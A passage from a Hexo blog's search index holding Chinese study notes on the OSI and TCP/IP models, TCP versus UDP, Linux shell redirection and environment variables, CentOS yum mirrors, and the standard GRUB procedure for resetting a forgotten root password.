src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627296657899-ff4ec8a6-f567-421b-981c-017719cdeccf.png#clientId=ue44d79d7-cdf3-4&amp;from=paste&amp;height=720&amp;id=u2ddeb6c9&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=720&amp;originWidth=960&amp;originalType=binary%E2%88%B6=1&amp;size=158223&amp;status=done&amp;style=none&amp;taskId=u9c8b0618-079a-44ad-bdcc-9d321cec8b3&amp;width=960" alt="image.png"></p><h2 id="三、区别"><a href="#三、区别" class="headerlink" title="三、区别"></a>三、区别</h2><ol><li>TCP/IP 他是一个协议簇，而 OSI（开放系统互联）则是一个模型，且 TCP/IP 的开发时间在 OSI 之前。</li><li>TCP/IP 是由一些交互性的模块做成的分层次的协议，其中每个模块提供特定的功能，OSI 则指定了哪个功能是属于哪一层的。</li><li>TCP/IP 是四层结构，而 OSI 是七层结构，OSI 的最高三层在 TCP 中用应用层表示。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP和UDP的区别和优缺点</title>
      <link href="/post/e8c36819.html"/>
      <url>/post/e8c36819.html</url>
      
        <content type="html"><![CDATA[<h1 id="TCP-和-UDP-的区别和优缺点"><a href="#TCP-和-UDP-的区别和优缺点" class="headerlink" title="TCP 和 UDP 的区别和优缺点"></a>TCP 和 UDP 的区别和优缺点</h1><h2 id="一、UDP"><a href="#一、UDP" class="headerlink" title="一、UDP"></a>一、UDP</h2><p>UDP（User Datagram Protocol），用户数据包协议，是一个简单的面向数据报的通信协议，即对应用层交下来的报文，不合并，不拆分，只是在其上面加上首部后就交给了下面的网络层。也就是说无论应用层交给 UDP 多长的报文，它统统发送，一次发送一个报文。而对接收方，接到后直接去除首部，交给上面的应用层就完成任务。UDP 报头包括 4 个字段，每个字段占用 2 个字节（即 16 个二进制位），标题短，开销小。</p><p>特点如下：</p><ul><li>UDP 不提供复杂的控制机制，利用 IP 提供面向无连接的通信服务。</li><li>传输途中出现丢包，UDP 也不负责重发。</li><li>当包的到达顺序出现乱序时，UDP 没有纠正的功能。</li><li>并且它是将应用程序发来的数据在收到的那一刻，立即按照原样发送到网络上的一种机制。即使是出现网络拥堵的情况，UDP 也无法进行流量控制等避免网络拥塞行为。</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627299232205-8172a73b-491b-44bb-ac8f-8d4d40f2efb6.png#clientId=u5941d336-2719-4&amp;from=paste&amp;height=195&amp;id=u3622eb47&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=162&amp;originWidth=607&amp;originalType=binary%E2%88%B6=1&amp;size=59413&amp;status=done&amp;style=none&amp;taskId=u61f8df63-6c47-447e-b22f-f131a3155cd&amp;width=729" alt="image.png"></p><h2 id="二、TCP"><a href="#二、TCP" class="headerlink" title="二、TCP"></a>二、TCP</h2><p>TCP（Transmission Control Protocol），传输控制协议，是一种可靠、<strong>面向字节流的通信协议</strong>，把上面应用层交下来的数据看成无结构的字节流来发送。<br>可以想象成流水形式的，发送方 TCP 会将数据放入“蓄水池”（缓存区），等到可以发送的时候就发送，不能发送就等着，TCP 会根据当前网络的拥塞状态来确定每个报文段的大小。<br>TCP 报文首部有 20 个字节，额外开销大。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627299314725-be18d32c-db69-4d60-ba5f-536cd7464920.png#clientId=u5941d336-2719-4&amp;from=paste&amp;height=416&amp;id=uf0dd3d58&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=355&amp;originWidth=594&amp;originalType=binary%E2%88%B6=1&amp;size=90777&amp;status=done&amp;style=none&amp;taskId=u75b264c1-147a-4353-8a68-7d362f40b8d&amp;width=696" alt="image.png"></p><h2 id="三、区别和优缺点"><a href="#三、区别和优缺点" class="headerlink" title="三、区别和优缺点"></a>三、区别和优缺点</h2><table><thead><tr><th>****</th><th><strong>TCP</strong></th><th><strong>UDP</strong></th></tr></thead><tbody><tr><td>可靠性</td><td>可靠</td><td>不可靠</td></tr><tr><td>连接性</td><td>面向连接</td><td>无连接</td></tr><tr><td>报文</td><td>面向字节流</td><td>面向报文</td></tr><tr><td>效率</td><td>传输效率低</td><td>传输效率高</td></tr><tr><td>双共性</td><td>全双工</td><td>一对一、一对多、多对一、多对多</td></tr><tr><td>流量控制</td><td>滑动窗口</td><td>无</td></tr><tr><td>拥塞控制</td><td>慢开始、拥塞避免、快重传、快恢复</td><td>无</td></tr><tr><td>传输效率</td><td>慢</td><td>快</td></tr></tbody></table><ul><li>TCP 是面向连接的协议，建立连接 3 次握手、断开连接四次挥手，UDP 是面向无连接，数据传输前后不进行连接，发送端只负责将数据发送到网络，接收端从消息队列读取。</li><li>TCP 提供可靠的服务，传输过程采用流量控制、编号与确认、计时器等手段确保数据无差错，不丢失。UDP 则尽可能传递数据，但不保证传递交付给对方。</li><li>TCP 面向字节流，将应用层报文看成一串无结构的字节流，分解为多个 TCP 报文段传输后，在目的站重新装配。UDP 协议面向报文，不拆分应用层报文，只保留报文边界，一次发送一个报文，接收方去除报文首部后，原封不动将报文交给上层应用。</li><li>TCP 只能点对点全双工通信。UDP 支持一对一、一对多、多对一和多对多的交互通信。</li></ul><p>​</p><h2 id="四、应用场景"><a href="#四、应用场景" class="headerlink" title="四、应用场景"></a>四、应用场景</h2><table><thead><tr><th><strong>应用协议</strong></th><th><strong>应用</strong></th><th><strong>传输层协议</strong></th></tr></thead><tbody><tr><td>SMTP</td><td>电子邮件</td><td>TCP</td></tr><tr><td>TELNET</td><td>远程终端接入</td><td></td></tr><tr><td>HTTP</td><td>万维网</td><td></td></tr><tr><td>FTP</td><td>文件传输</td><td></td></tr><tr><td>DNS</td><td>域名解析</td><td>UDP</td></tr><tr><td>TFTP</td><td>文件传输</td><td></td></tr><tr><td>SNMP</td><td>网络管理</td><td></td></tr><tr><td>NFS</td><td>远程未接服务器</td><td></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSI七层模型</title>
      <link href="/post/b1538fc8.html"/>
      <url>/post/b1538fc8.html</url>
      
        <content type="html"><![CDATA[<h1 id="OSI-七层模型"><a href="#OSI-七层模型" class="headerlink" title="OSI 七层模型"></a>OSI 七层模型</h1><h2 id="一、是什么？"><a href="#一、是什么？" class="headerlink" title="一、是什么？"></a>一、是什么？</h2><p>OSI 模型（Open System Interconnection Reference Model，缩写为 OSI）, 全名 “开放式系统互联通信参考模型”，是一个试图使各种计算机在全世界范围内互联为网络的标准框架。1983 年，国际标准组织（ISO）发布了著名的 ISO/IEC 7498 标准，它定义了网络互联的 7 层框架，也就是开放式系统互联参考模型。<br>​</p><h2 id="二、划分"><a href="#二、划分" class="headerlink" title="二、划分"></a>二、划分</h2><p>7 层是指 OSI 七层协议模型，主要是：</p><ul><li>应用层（Application）</li><li>表示层（Presentation）</li><li>会话层（Session）</li><li>传输层（Transport）</li><li>网络层（Network）</li><li>数据链路层（Data Link）</li><li>物理层（Physical）</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627294808446-ade8058e-90fb-4b0c-ba09-f1b996da3a38.png#clientId=uf9cf67d8-9388-4&amp;from=paste&amp;height=451&amp;id=u38a6f007&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=451&amp;originWidth=180&amp;originalType=binary%E2%88%B6=1&amp;size=49654&amp;status=done&amp;style=none&amp;taskId=uad216a83-e9d1-44eb-9bad-21c6ad52503&amp;width=180" alt="image.png"></p><h2 id="三、详细介绍"><a href="#三、详细介绍" class="headerlink" title="三、详细介绍"></a>三、详细介绍</h2><table><thead><tr><th><strong>名称</strong></th><th><strong>主要功能</strong></th><th><strong>典型设备</strong></th><th><strong>典型协议、标准和应用</strong></th></tr></thead><tbody><tr><td>应用层</td><td>为应用软件提供接口，使应用程序能够使用网络服务</td><td>网关</td><td>http(80)、ftp(20/21)、smtp(25)、pop3(110)、telnet(23)、dns(53)</td></tr><tr><td>表示层</td><td>数据的解码和编码，数据的加密和解密，数据的压缩和解压缩</td><td>网关</td><td>ASCLL、PICT、TIFF、JPEG、 MIDI、MPEG</td></tr><tr><td>会话层</td><td>建立、维护、管理应用程序之间的会话</td><td>网关</td><td>RPC、SQL、NFS 、X WINDOWS、ASP</td></tr><tr><td>传输层</td><td>负责建立端到端的链接，保证保温在端到端之间的传输</td><td>网关</td><td>TCP、UDP、SPX</td></tr><tr><td>网络层</td><td>负责将分组数据从源端传输到目的端，网络层的主要作用就是路由和寻址</td><td>路由器</td><td>IP、IPX、APPLETALK、ICMP</td></tr><tr><td>数据链路层</td><td>在不可靠的物理链路上，提供可靠的数据传输服务</td><td>交换机、网桥、网卡</td><td>802.2、802.3ATM、HDLC、FRAME RELAY</td></tr><tr><td>物理层</td><td>利用传输介质为数据链路层提供物理连接，实现比特流的透明传输</td><td>集线器、中继器</td><td>V.35、EIA/TIA-232</td></tr></tbody></table><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627386380608-97191207-3c72-448d-9352-6d1082e23210.png#clientId=u2460289d-5e75-4&amp;from=paste&amp;height=722&amp;id=uc903b4eb&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=722&amp;originWidth=710&amp;originalType=binary%E2%88%B6=1&amp;size=94686&amp;status=done&amp;style=none&amp;taskId=u97078a52-2357-4ccd-ae94-cf7506bd41f&amp;width=710" alt="image.png"></p><h2 id="四、数据封装和解封装"><a href="#四、数据封装和解封装" class="headerlink" title="四、数据封装和解封装"></a>四、数据封装和解封装</h2><h3 id="1-封装过程"><a href="#1-封装过程" class="headerlink" title="1. 封装过程"></a>1. 封装过程</h3><ol><li> 用户信息转换为数据，以便在网络上传输。</li><li> 数据转换为数据段，并在发送方和接收方主机之间建立以条可靠的连接。</li><li> 数据段转换为数据包或数据报，并且在报头中放上逻辑地址，这样，每以个数据包都可以通过互联网进行传输。</li><li> 数据包或数据报转换为帧，以便在本地网络中传输。在本地网段上，使用硬件（以太网）地址唯一表示每一台主机。</li><li>帧转换为比特流，并采用数字编码和时钟方案。<blockquote><p>注：数据流是从高层往下封装的，解封装和它的过程相反。</p></blockquote></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627296316686-4bf49c7d-732d-4f6a-abcd-005bc14b76c0.png#clientId=uf9cf67d8-9388-4&amp;from=paste&amp;height=699&amp;id=u7eaa200c&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=699&amp;originWidth=932&amp;originalType=binary%E2%88%B6=1&amp;size=212722&amp;status=done&amp;style=none&amp;taskId=u340f6cae-6f51-4142-9da4-028d6d5f600&amp;width=932" alt="image.png"></p><h3 id="2-解封装过程"><a href="#2-解封装过程" class="headerlink" title="2. 解封装过程"></a>2. 解封装过程</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1627296366611-19cc4652-d6e3-4099-b4c0-31c336eaff75.png#clientId=uf9cf67d8-9388-4&amp;from=paste&amp;height=697&amp;id=ua9920a74&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=697&amp;originWidth=972&amp;originalType=binary%E2%88%B6=1&amp;size=208391&amp;status=done&amp;style=none&amp;taskId=u7d0a8ac1-05ee-4600-ad3e-84192d1fe9f&amp;width=972" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 重定向、管道符与环境变量</title>
      <link href="/post/eedeed89.html"/>
      <url>/post/eedeed89.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-重定向、管道符与环境变量"><a href="#Linux-重定向、管道符与环境变量" class="headerlink" title="Linux 重定向、管道符与环境变量"></a>Linux 重定向、管道符与环境变量</h1><h2 id="一、重定向"><a href="#一、重定向" class="headerlink" title="一、重定向"></a>一、重定向</h2><h3 id="1-输入输出重定向"><a href="#1-输入输出重定向" class="headerlink" title="1. 输入输出重定向"></a>1. 输入输出重定向</h3><table><thead><tr><th><strong>名称</strong></th><th><strong>英文</strong></th><th><strong>文件描述符</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>标准输入重定向</td><td>STDIN</td><td>0</td><td>默认从键盘输入，也可从其他文件或命令中输入</td></tr><tr><td>标准输出重定向</td><td>STDOUT</td><td>1</td><td>默认输出到屏幕</td></tr><tr><td>错误输出重定向</td><td>STDERR</td><td>2</td><td>默认输出到屏幕</td></tr></tbody></table><h3 id="2-输入重定向中用到的符号及其作用"><a href="#2-输入重定向中用到的符号及其作用" class="headerlink" title="2. 输入重定向中用到的符号及其作用"></a>2. 输入重定向中用到的符号及其作用</h3><table><thead><tr><th><strong>符号</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>命令 &lt; 文件</td><td>将文件作为命令的标准输入</td></tr><tr><td>命令 &lt;&lt; 分界符</td><td>从标准输入中读入，直到遇见分界符才停止</td></tr><tr><td>命令 &lt; 文件 1 &gt; 文件 2</td><td>将文件 1 作为命令的标准输入并将标准输出到文件 2</td></tr></tbody></table><h3 id="3-输出重定向中用到的符号及其作用"><a href="#3-输出重定向中用到的符号及其作用" class="headerlink" title="3. 输出重定向中用到的符号及其作用"></a>3. 输出重定向中用到的符号及其作用</h3><table><thead><tr><th><strong>符号</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>命令 &gt; 文件</td><td>将标准输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令 2&gt; 文件</td><td>将错误输出重定向到一个文件中（清空原有文件的数据）</td></tr><tr><td>命令 &gt;&gt; 文件</td><td>将标准输出重定向到一个文件中（追加到原有内容的后面）</td></tr><tr><td>命令 2&gt;&gt; 文件</td><td>将错误输出重定向到一个文件中（追加到原有内容的后面）</td></tr></tbody></table><p>| 命令 &gt;&gt; 文件 2&gt;&amp;1<br>或<br>命令 &amp;&gt;&gt; 文件 | 将标准输出与错误输出共同写入到文件中（追加到原有内容的后面） |</p><blockquote><p>注意：对于重定向中的标准输出模式，可以省略文件描述符 1 不写，而错误输出模式的文件描述符 2 是必须要写的。</p></blockquote><p>​</p><h2 id="二、管道命令符"><a href="#二、管道命令符" class="headerlink" title="二、管道命令符"></a>二、管道命令符</h2><h3 id="1-命令格式"><a href="#1-命令格式" class="headerlink" title="1. 命令格式"></a>1. 命令格式</h3><p><code>"命令A | 命令B"</code></p><h3 id="2-解释"><a href="#2-解释" class="headerlink" title="2. 解释"></a>2. 解释</h3><p>把前一个命令原本要输出到屏幕的标准正常数据当作是后一个命令的标准输入。</p><h3 id="3-示例"><a href="#3-示例" class="headerlink" title="3. 示例"></a>3. 示例</h3><p>统计 nologin 用户数</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token function">grep</span> <span class="token string">"/sbin/nologin"</span> /etc/passwd <span class="token operator">|</span> <span class="token function">wc</span> -l16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>修改用户密码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "123456" | passwd --stdin truda</span>Changing password <span class="token keyword">for</span> user truda.passwd: all authentication tokens updated successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>发送邮件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mail -s "Readme" truda@163.com &lt;&lt; over</span><span class="token operator">></span> I think linux is very practical<span class="token operator">></span> I hope to learn <span class="token function">more</span><span class="token operator">></span> can you teach me ?<span class="token operator">></span> over<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、命令行通配符"><a href="#三、命令行通配符" class="headerlink" title="三、命令行通配符"></a>三、命令行通配符</h2><h3 id="1-通配符列表"><a href="#1-通配符列表" class="headerlink" title="1. 通配符列表"></a>1. 通配符列表</h3><table><thead><tr><th><strong>通配符</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>星号（*）</td><td>代表匹配零个或多个字符</td></tr><tr><td>问号（?）</td><td>代表匹配单个字符</td></tr><tr><td>[0-9]</td><td>代表匹配 0 ～ 9 之间的单个数字的字符</td></tr><tr><td>[abc]</td><td>代表匹配 a、b、c 三个字符中的任意一个字符</td></tr></tbody></table><h3 id="2-示例"><a href="#2-示例" class="headerlink" title="2. 示例"></a>2. 示例</h3><p>匹配所有在/dev 目录中且以 sda 开头的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ ll /dev/sda*brw-rw----. 1 root disk 8, 0 Jul 22 10:43 /dev/sdabrw-rw----. 1 root disk 8, 1 Jul 22 10:43 /dev/sda1brw-rw----. 1 root disk 8, 2 Jul 22 10:43 /dev/sda2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、常用转义字符"><a href="#四、常用转义字符" class="headerlink" title="四、常用转义字符"></a>四、常用转义字符</h2><table><thead><tr><th><strong>字符</strong></th><th><strong>解释</strong></th></tr></thead><tbody><tr><td>反斜杠（\）</td><td>使反斜杠后面的一个变量变为单纯的字符串</td></tr><tr><td>单引号（’’）</td><td>转义其中所有的变量为单纯的字符串</td></tr><tr><td>双引号（””）</td><td>保留其中的变量属性，不进行转义处理</td></tr><tr><td>反引号（``）</td><td>把其中的命令执行后返回结果</td></tr></tbody></table><h2 id="五、环境变量"><a href="#五、环境变量" class="headerlink" title="五、环境变量"></a>五、环境变量</h2><h3 id="1-什么是环境变量"><a href="#1-什么是环境变量" class="headerlink" title="1. 什么是环境变量"></a>1. 什么是环境变量</h3><p>环境变量 = 固定的变量名 + 用户或系统设置的变量值</p><h3 id="2-Linux-系统中最重要的-10-个环境变量"><a href="#2-Linux-系统中最重要的-10-个环境变量" class="headerlink" title="2. Linux 系统中最重要的 10 个环境变量"></a>2. Linux 系统中最重要的 10 个环境变量</h3><table><thead><tr><th><strong>变量名称</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>HOME</td><td>用户的主目录（即家目录）</td></tr><tr><td>SHELL</td><td>用户在使用的 Shell 解释器名称</td></tr><tr><td>HISTSIZE</td><td>输出的历史命令记录条数</td></tr><tr><td>HISTFILESIZE</td><td>保存的历史命令记录条数</td></tr><tr><td>MAIL</td><td>邮件保存路径</td></tr><tr><td>LANG</td><td>系统语言、语系名称</td></tr><tr><td>RANDOM</td><td>生成一个随机数字</td></tr><tr><td>PS1</td><td>Bash 解释器的提示符</td></tr><tr><td>PATH</td><td>定义解释器搜索用户执行命令的路径</td></tr><tr><td>EDITOR</td><td>用户默认的文本编辑器</td></tr></tbody></table><h3 id="3-常用操作"><a href="#3-常用操作" class="headerlink" title="3. 常用操作"></a>3. 常用操作</h3><p>查看环境变量的值</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token keyword">echo</span> <span class="token variable">$HOME</span>/home/truda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>设置临时环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ WORKDIR<span class="token operator">=</span>/home/truda/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>设置永久环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 系统环境变量</span><span class="token keyword">echo</span> <span class="token string">'export WORKDIR=/home/truda/'</span> <span class="token operator">>></span> /etc/profile<span class="token comment" spellcheck="true"># 用户环境变量</span><span class="token keyword">echo</span> <span class="token string">'export WORKDIR=/home/truda/'</span> <span class="token operator">>></span> ~/.bashrc<span class="token keyword">echo</span> <span class="token string">'export WORKDIR=/home/truda/'</span> <span class="token operator">>></span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提升环境变量为全局变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ WORKDIR<span class="token operator">=</span>/home/truda<span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token function">export</span> WORKDIR<span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token function">su</span> rootPassword:<span class="token punctuation">[</span>root@localhost truda<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo $WORKDIR</span>/home/truda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos网络Yum源配置</title>
      <link href="/post/59e3b058.html"/>
      <url>/post/59e3b058.html</url>
      
        <content type="html"><![CDATA[<h1 id="Centos-网络-Yum-源配置"><a href="#Centos-网络-Yum-源配置" class="headerlink" title="Centos 网络 Yum 源配置"></a>Centos 网络 Yum 源配置</h1><h2 id="一、基本命令"><a href="#一、基本命令" class="headerlink" title="一、基本命令"></a>一、基本命令</h2><ol><li>获取当前系统版本 ：cat /etc/centos-release</li><li>进入 yum 源配置目录 ：cd /etc/yum.repos.d/</li><li>备份 yum 源 ：mv CentOS-Base.repo CentOS-Base.repo.bak</li><li>下载国内源 ： wget -O /etc/yum.repos.d/CentOS-Base.repo 对应系统版本源地址</li><li>清除缓存：yum clean all</li><li>生成缓存：yum makecache</li><li>更新软件：yum update -y</li></ol><h2 id="二、Centos-7-源"><a href="#二、Centos-7-源" class="headerlink" title="二、Centos 7 源"></a>二、Centos 7 源</h2><h3 id="1-阿里源"><a href="#1-阿里源" class="headerlink" title="1. 阿里源"></a>1. 阿里源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>aliyun-os<span class="token punctuation">]</span>name<span class="token operator">=</span>aliyun-osbaseurl<span class="token operator">=</span>https://mirrors.aliyun.com/centos/7/os/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>0<span class="token punctuation">[</span>aliyun-epel<span class="token punctuation">]</span>name<span class="token operator">=</span>aliyun-epelbaseurl<span class="token operator">=</span>https://mirrors.aliyun.com/epel/7/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>0<span class="token punctuation">[</span>aliyun-extra<span class="token punctuation">]</span>name<span class="token operator">=</span>aliyun-extrabaseurl<span class="token operator">=</span>https://mirrors.aliyun.com/centos/7/extras/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-Centos7-网易源"><a href="#2-Centos7-网易源" class="headerlink" title="2. Centos7 网易源"></a>2. Centos7 网易源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>net-163<span class="token punctuation">]</span>name<span class="token operator">=</span>www.163.combaseurl<span class="token operator">=</span>http://mirrors.163.com/centos/7/os/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>http://mirrors.163.com/centos/7/os/x86_64/RPM-GPG-KEY-CentOS-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、其它"><a href="#三、其它" class="headerlink" title="三、其它"></a>三、其它</h2><h3 id="1-阿里云"><a href="#1-阿里云" class="headerlink" title="1. 阿里云"></a>1. 阿里云</h3><p>CentOS 5：<a href="http://mirrors.aliyun.com/repo/Centos-5.repo">http://mirrors.aliyun.com/repo/Centos-5.repo</a><br>CentOS 6：<a href="http://mirrors.aliyun.com/repo/Centos-6.repo">http://mirrors.aliyun.com/repo/Centos-6.repo</a><br>CentOS 7：<a href="http://mirrors.aliyun.com/repo/Centos-7.repo">http://mirrors.aliyun.com/repo/Centos-7.repo</a><br>​</p><h3 id="2-网易"><a href="#2-网易" class="headerlink" title="2. 网易"></a>2. 网易</h3><p>CentOS 5：<a href="http://mirrors.163.com/.help/CentOS5-Base-163.repo">http://mirrors.163.com/.help/CentOS5-Base-163.repo</a><br>CentOS 6：<a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo">http://mirrors.163.com/.help/CentOS6-Base-163.repo</a><br>CentOS 7：<a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo">http://mirrors.163.com/.help/CentOS7-Base-163.repo</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 忘记密码重置</title>
      <link href="/post/58e6bfe9.html"/>
      <url>/post/58e6bfe9.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-忘记密码重置"><a href="#Linux-忘记密码重置" class="headerlink" title="Linux 忘记密码重置"></a>Linux 忘记密码重置</h1><h2 id="一、RHEL-6-或-CentOS-6"><a href="#一、RHEL-6-或-CentOS-6" class="headerlink" title="一、RHEL 6 或 CentOS 6"></a>一、RHEL 6 或 CentOS 6</h2><ol><li>先重启，在开机的时候按任意键，一般是上下键，进入 menu</li><li>选择对应的 kernel，按 e 进行编辑</li><li>进入编辑界面后在 quiet 后面按空格，输入 1 ，按回车</li><li>在 menu 界面按 b ，让 boot 引导启动系统</li><li>进入单用户模式，输入 passwd 改密码</li><li>reboot 重启</li></ol><h2 id="二、RHEL-7-或-CentOS-7"><a href="#二、RHEL-7-或-CentOS-7" class="headerlink" title="二、RHEL 7 或 CentOS 7"></a>二、RHEL 7 或 CentOS 7</h2><ol><li>先重启，在开机的时候按任意键，一般是上下键，进入 menu</li><li>选择要修改的 kernel，按 e 进行编辑</li><li>在 linux16 这一行的最后输入 rd.break ，记住这个配置之前要有一个空格，按 Ctrl+x 启动紧急救援模式</li><li>进入紧急救援模式，以读写的方式重新挂载根分区： mount -o remount,rw /sysroot</li><li>改变根分区， chroot /sysroot</li><li>改密码， passwd</li><li>重新打标签： touch /.autorelabel</li><li>exit 退出 sh， reboot 重启系统</li></ol><p>​</p><h2 id="三、RHEL-8-或-CentOS-8"><a href="#三、RHEL-8-或-CentOS-8" class="headerlink" title="三、RHEL 8 或 CentOS 8"></a>三、RHEL 8 或 CentOS 8</h2><ol><li>先重启，在开机的时候按任意键，一般是上下键，进入 menu</li><li>选择要修改的 kernel，按 e 进行编辑</li><li>在以 linux 开头的行，它看起来像下面的输出，这一行的最后输入 rd.break ，记住这个配置之前要有一个空格，按 Ctrl+x 启动紧急救援模式</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628080571070-fff75cab-9b3e-46de-9d1c-57cb8cbb91e5.png#clientId=ue392a8d7-2498-4&amp;from=paste&amp;height=138&amp;id=u473a4c30&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=138&amp;originWidth=721&amp;originalType=binary%E2%88%B6=1&amp;size=45587&amp;status=done&amp;style=none&amp;taskId=ufac2348c-c728-42cf-95c7-034f23fc71f&amp;width=721" alt="image.png"></p><ol start="4"><li>进入紧急救援模式，以读写的方式重新挂载根分区： mount -o remount,rw /sysroot</li><li>改变根分区， chroot /sysroot</li><li>改密码， passwd</li><li>重新打标签： touch /.autorelabel</li><li>exit 退出 sh， reboot 重启系统</li></ol><p>​</p><h2 id="四、Debian-系列"><a href="#四、Debian-系列" class="headerlink" title="四、Debian 系列"></a>四、Debian 系列</h2><ol><li>开机按住任何键（shift）停住 grub 菜单</li><li>进入 advanced option for ubuntu</li><li>出现的菜单中，光标移动至…（recovery mode）</li><li>按 e 进入编辑</li><li>找到 ro recovery nomodeset 更改为 rw single init=/bin/bash</li><li>最后按 Ctrl-x 或者 F10 启动修复模式</li><li>输入 passwd 修改 root 密码</li><li>重启</li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux系统更新源大全</title>
      <link href="/post/722c0af7.html"/>
      <url>/post/722c0af7.html</url>
      
